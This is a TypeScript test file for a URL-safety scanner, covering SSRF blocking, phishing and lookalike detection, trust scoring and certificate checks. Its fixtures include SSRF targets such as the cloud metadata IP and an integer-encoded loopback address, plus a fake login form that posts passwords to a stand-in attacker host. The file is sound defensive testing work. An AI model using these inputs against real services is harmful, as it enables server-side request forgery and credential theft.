import test from 'node:test';
import assert from 'node:assert/strict';

import { validateUrlForSSRF } from '../src/lib/engines/ssrfGuard.ts';
import { analyzeThreatFeatures } from '../src/lib/engines/threatEngine.ts';
import { computeUnifiedTrustScore } from '../src/lib/engines/scoringEngine.ts';
import { inspectCertificate } from '../src/lib/engines/certificateEngine.ts';

test('SSRF Guard: blocks dangerous private and metadata targets', async () => {
  const loopback = await validateUrlForSSRF('http://127.0.0.1:8080/admin');
  assert.equal(loopback.safe, false, 'Should block 127.0.0.1');

  const metadata = await validateUrlForSSRF('http://169.254.169.254/latest/meta-data/');
  assert.equal(metadata.safe, false, 'Should block AWS metadata IP');

  const rfc1918_10 = await validateUrlForSSRF('http://10.1.2.3/');
  assert.equal(rfc1918_10.safe, false, 'Should block 10.0.0.0/8');

  const rfc1918_192 = await validateUrlForSSRF('http://192.168.1.100/');
  assert.equal(rfc1918_192.safe, false, 'Should block 192.168.0.0/16');

  const localhost = await validateUrlForSSRF('http://localhost:3000/');
  assert.equal(localhost.safe, false, 'Should block localhost');

  const ipv6 = await validateUrlForSSRF('http://[::1]/');
  assert.equal(ipv6.safe, false, 'Should block IPv6 loopback');

  const encodedIp = await validateUrlForSSRF('http://2130706433/'); // 127.0.0.1 in integer
  assert.equal(encodedIp.safe, false, 'Should block integer encoded private IP');
});

test('SSRF Guard: allows legitimate public domain', async () => {
  const publicTarget = await validateUrlForSSRF('https://example.com');
  assert.equal(publicTarget.safe, true, 'Should allow public domain');
  assert.equal(publicTarget.hostname, 'example.com');
});

test('Threat Engine: identifies PayPal lookalike and homoglyph attacks', () => {
  const result = analyzeThreatFeatures('https://paypa1-secure-login.com/auth/verify');
  assert.ok(result.threatRisk >= 75, `Expected threat risk >= 75, got ${result.threatRisk}`);

  const hasLookalike = result.reasons.some(r => r.code === 'BRAND_LOOKALIKE' || r.code === 'BRAND_SUBDOMAIN_DECEPTION');
  assert.equal(hasLookalike, true, 'Should detect BRAND_LOOKALIKE for paypa1');
  assert.equal(result.features.impersonatedBrand?.toLowerCase(), 'paypal');
});

test('Threat Engine: detects off-domain credential harvesting form actions', () => {
  const htmlWithOffDomainForm = `
    <html>
      <body>
        <form action="https://evil-attacker-drop.com/steal" method="POST">
          <input type="text" name="user" />
          <input type="password" name="password" />
          <button type="submit">Sign In</button>
        </form>
      </body>
    </html>
  `;

  const result = analyzeThreatFeatures('https://legitimate-looking-site.com/login', htmlWithOffDomainForm);
  const hasOffDomainForm = result.reasons.some(r => r.code === 'LOGIN_FORM_OFFDOMAIN');
  assert.equal(hasOffDomainForm, true, 'Should detect LOGIN_FORM_OFFDOMAIN');
});

test('Scoring Engine: computes 40/25/20/15 weighted score and hard overrides', () => {
  // Case A: High threat risk with lookalike -> must override to malicious
  const maliciousScoring = computeUnifiedTrustScore(
    90, // threatRisk
    40, // certRisk
    50, // websecRisk
    80, // intelRisk
    [{ code: 'BRAND_LOOKALIKE', engine: 'threat', severity: 'high', title: 'Lookalike', detail: 'test', weight: 40 }],
    'paypa1-fake.com'
  );
  assert.equal(maliciousScoring.verdict, 'malicious');
  assert.ok(maliciousScoring.score <= 35, `Expected malicious score <= 35, got ${maliciousScoring.score}`);

  // Case B: Clean domain -> safe
  const safeScoring = computeUnifiedTrustScore(
    5, // threatRisk
    5, // certRisk
    10, // websecRisk
    0, // intelRisk
    [],
    'example.com'
  );
  assert.equal(safeScoring.verdict, 'safe');
  assert.ok(safeScoring.score >= 85, `Expected safe score >= 85, got ${safeScoring.score}`);
});

test('Certificate Engine: fallback test for expired badssl host', async () => {
  const result = await inspectCertificate('expired.badssl.com', 443, 2000);
  assert.equal(result.summary.valid, false, 'Expired badssl should be invalid');
  assert.ok(result.summary.flags.includes('EXPIRED'), 'Should contain EXPIRED flag');
  assert.ok(result.certRisk >= 40, `Expected certRisk >= 40, got ${result.certRisk}`);
});

